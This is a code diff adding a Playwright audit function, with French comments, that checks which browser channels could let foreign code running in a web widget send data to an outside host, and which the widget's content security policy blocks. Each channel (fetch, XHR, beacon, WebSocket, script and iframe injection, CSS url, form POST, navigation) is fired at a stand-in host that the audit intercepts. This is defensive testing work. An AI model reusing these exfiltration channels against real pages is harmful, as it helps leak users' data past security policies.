@@ -75,3 +75,51 @@ export async function kitDependancePiegee(p) {
   }
   return sortie;
 }
+
+/**
+ * Les canaux de sortie : par quelles voies du navigateur du code étranger, qui s'exécute dans le cadre du widget, pourrait envoyer ce qu'il
+ * a lu vers un hôte extérieur. Chaque voie est tentée une fois, vers un hôte factice que l'audit intercepte (rien ne sort de la machine),
+ * avec un marqueur unique dans l'adresse : l'audit voit côté réseau quelles tentatives ont abouti, et ici quelles tentatives la politique de
+ * sécurité (CSP) du widget a arrêtées. Jouée dans une passe à part : ces requêtes ne se mêlent pas à celles du widget (essai 13).
+ *
+ * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
+ * @param {{hote: string, prefixe: string}} p
+ */
+export async function kitCanaux(p) {
+  const violations = [];
+  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 60) violations.push({ directive: e.violatedDirective, bloque: String(e.blockedURI).slice(0, 200) }); });
+  const marque = (nom) => `${p.prefixe}-CANAL-${nom.toUpperCase()}`;
+  // Un sous-domaine par voie : Chromium ne rapporte que l'origine d'un cadre bloqué, le nom de la voie doit s'y lire.
+  const url = (nom) => `https://${nom}.${p.hote}/c?d=${marque(nom)}`;
+  const racine = () => document.body || document.documentElement;
+  const tete = () => document.head || document.documentElement;
+  const tentatives = {};
+  const reseau = {};
+  const essayer = (nom, f) => {
+    try { const r = f(); if (r && typeof r.catch === 'function') r.catch(() => {}); tentatives[nom] = 'lancee'; }
+    catch (e) { tentatives[nom] = `exception : ${String((e && e.message) || e).slice(0, 100)}`; }
+  };
+  const lier = (nom, rel) => { const l = document.createElement('link'); l.rel = rel; l.href = url(nom); tete().appendChild(l); };
+
+  essayer('fetch', () => fetch(url('fetch'), { mode: 'no-cors' }));
+  essayer('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', url('xhr')); x.send(); });
+  essayer('image', () => { new Image().src = url('image'); });
+  essayer('beacon', () => navigator.sendBeacon(url('beacon'), marque('beacon')));
+  // Vraie WebSocket (la passe n'intercepte pas celles-ci : l'interception de Playwright les soustrait à la CSP) : si aucune CSP ne l'arrête, la connexion est tentée puis échoue faute de DNS.
+  essayer('websocket', () => { const w = new WebSocket(url('websocket').replace(/^https/, 'wss')); w.onerror = () => { reseau.websocket = 'tentative'; }; w.onclose = () => { reseau.websocket = reseau.websocket || 'tentative'; }; });
+  essayer('script', () => { const s = document.createElement('script'); s.src = url('script'); tete().appendChild(s); });
+  essayer('iframe', () => { const f = document.createElement('iframe'); f.hidden = true; f.src = url('iframe'); racine().appendChild(f); });
+  essayer('feuille', () => lier('feuille', 'stylesheet'));
+  essayer('cssurl', () => { const d = document.createElement('div'); d.style.cssText = `width:1px;height:1px;background-image:url("${url('cssurl')}")`; racine().appendChild(d); });
+  essayer('prefetch', () => lier('prefetch', 'prefetch'));
+  essayer('formulaire', () => {
+    const cadre = document.createElement('iframe'); cadre.name = 'gw_canal_formulaire'; cadre.hidden = true; racine().appendChild(cadre);
+    const f = document.createElement('form'); f.method = 'POST'; f.action = url('formulaire'); f.target = 'gw_canal_formulaire';
+    const i = document.createElement('input'); i.name = 'd'; i.value = marque('formulaire'); f.appendChild(i); racine().appendChild(f); f.submit();
+  });
+  await new Promise((r) => setTimeout(r, 2000));
+  // En dernier : la navigation du cadre lui-même vers l'extérieur (aucune CSP ne la ferme).
+  essayer('navigation', () => { location.replace(url('navigation')); });
+  await new Promise((r) => setTimeout(r, 800));
+  return { tentatives, violations, reseau };
+}
